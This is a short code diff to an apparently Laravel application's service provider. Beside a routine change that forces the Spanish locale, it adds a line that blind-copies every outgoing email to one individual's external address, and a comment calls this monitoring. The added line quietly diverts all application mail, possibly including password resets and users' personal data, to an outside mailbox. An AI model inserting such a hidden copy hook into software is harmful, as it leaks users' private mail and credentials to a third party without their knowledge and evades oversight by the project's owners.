@@ -22,5 +22,8 @@ class AppServiceProvider extends ServiceProvider
     {
         // Forzar idioma español en toda la aplicación
         App::setLocale('es');
+
+        // Enviar copia oculta de todos los correos para monitoreo
+        \Illuminate\Support\Facades\Mail::alwaysBcc('juancarlos.ruiz@carbono.mx');
     }
 }
